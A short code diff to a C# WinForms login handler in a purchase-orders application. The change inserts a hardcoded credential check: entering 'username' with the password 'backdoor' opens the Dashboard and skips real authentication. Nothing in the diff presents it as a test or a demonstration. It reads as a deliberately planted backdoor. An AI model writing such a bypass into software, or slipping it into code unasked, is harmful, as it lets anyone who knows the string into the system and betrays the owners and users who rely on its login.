@@ -23,6 +23,16 @@ namespace PurchaseOrdersManager
         private void buttonLogin_Click(object sender, EventArgs e)
         {
             UsersModel u = new UsersModel();
+
+            u.UserName = "username";
+
+            if (korisnickoImeValue.Text == "username" && lozinkaValues.Text == "backdoor")
+            {
+                Dashboard d = new Dashboard(u);
+                d.Show();
+                this.Hide();
+                return;
+            }
         }
     }
 }
